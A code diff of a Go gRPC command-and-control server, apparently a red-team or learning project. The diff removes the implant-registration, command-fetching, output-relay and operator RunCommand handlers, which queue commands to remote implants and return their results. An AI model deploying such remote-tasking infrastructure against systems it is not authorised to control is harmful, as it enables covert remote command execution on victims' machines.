@@ -1,9 +1,6 @@
 package main
 
 import (
-	"context"
-	"errors"
-	"fmt"
 	"net"
 	"net/http"
 	_ "net/http/pprof"
@@ -19,133 +16,23 @@ type session struct {
 	out chan *grpcapi.Command
 }
 
-type implantServer struct {
-	grpcapi.ImplantServer
-}
-
-type adminServer struct {
-	implants map[uuid.UUID][]uuid.UUID
-	grpcapi.AdminServer
-}
-
 var (
 	logger                          = log.InitLogger()
 	implants map[uuid.UUID]*session = make(map[uuid.UUID]*session)
 )
-
-func newImplantServer() *implantServer {
-	s := new(implantServer)
-	return s
-}
-
-func newAdminServer(work, output chan *grpcapi.Command) *adminServer {
-	s := new(adminServer)
-	return s
-}
-
-func (s *implantServer) RegisterImplant(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Identity, error) {
-	var id uuid.UUID
-	var err error
-	if identity != nil {
-		id, err = uuid.Parse(identity.Id)
-		if !uuid.IsInvalidLengthError(err) {
-			return nil, err
-		}
-		if implants[id] != nil {
-			logger.Debug("Connected", "UUID", identity.Id)
-			return identity, nil
-		}
-	}
-	if identity == nil || uuid.IsInvalidLengthError(err) {
-		id = uuid.New()
-	}
-	identity.Id = id.String()
-	implants[id] = &session{make(chan *grpcapi.Command), make(chan *grpcapi.Command)}
-	logger.Debug("New Implant", "UUID", identity.Id)
-	return identity, nil
-}
-
-func (s *implantServer) FetchCommand(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Command, error) {
-	// cmd := new(grpcapi.Command)
-	if identity == nil {
-		return nil, errors.New("no identity given")
-	}
-	id, err := uuid.Parse(identity.Id)
-	if err != nil {
-		logger.Debug("No se envio un id correcto.")
-		return nil, err
-	}
-	if implants[id] == nil {
-		logger.Debug("No se envio un id correcto.")
-		return nil, errors.New("no such id")
-	}
-	// select {
-	// case cmd, ok := <-implants[id].in:
-	cmd, ok := <-implants[id].in
-	if ok {
-		logger.Debug("Comando recibido.", "CMD", cmd.In, "Implant", identity.Name)
-		cmd.Id = identity.Id
-		return cmd, nil
-	}
-	implants[id] = nil
-	err = errors.New("channel closed")
-	fmt.Println(err)
-	return cmd, err
-	// }
-}
-
-func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
-	id, err := uuid.Parse(result.Id)
-	if err != nil {
-		return nil, err
-	}
-	if implants[id] == nil {
-		return nil, errors.New("no such id")
-	}
-	// TODO: Comprobar si el canal out esta cerrado
-	implants[id].out <- result
-	logger.Debug("Resultado enviado al administrador.")
-	return &grpcapi.Empty{}, nil
-}
-
-func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) (*grpcapi.Command, error) {
-	var res *grpcapi.Command
-	id, err := uuid.Parse(command.Id)
-	if err != nil {
-		return nil, err
-	}
-	if implants[id] == nil {
-		return nil, errors.New("cant run command, no such id")
-	}
-	if command.In == "quit" {
-		close(implants[id].in)
-		close(implants[id].out)
-		logger.Debug("Implant Cerrado")
-		return nil, nil
-	}
-	go func() {
-		implants[id].in <- command
-	}()
-	logger.Debug("Enviado comando al Servidor.", "CMD", command.In)
-	res = <-implants[id].out
-	logger.Debug("Resultado recibido.")
-	return res, nil
-}
 
 func main() {
 	var (
 		implantListener, adminListener net.Listener
 		err                            error
 		opts                           []grpc.ServerOption
-		work, output                   chan *grpcapi.Command
 	)
 	go func() {
 		http.ListenAndServe("localhost:6060", nil)
 	}()
 	logger.SetLevel(log.DebugLevel)
-	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 	implant := newImplantServer()
-	admin := newAdminServer(work, output)
+	admin := newAdminServer()
 	clientAddr := ":9090"
 	implantAddr := ":4444"
 	if implantListener, err = net.Listen("tcp", implantAddr); err != nil {
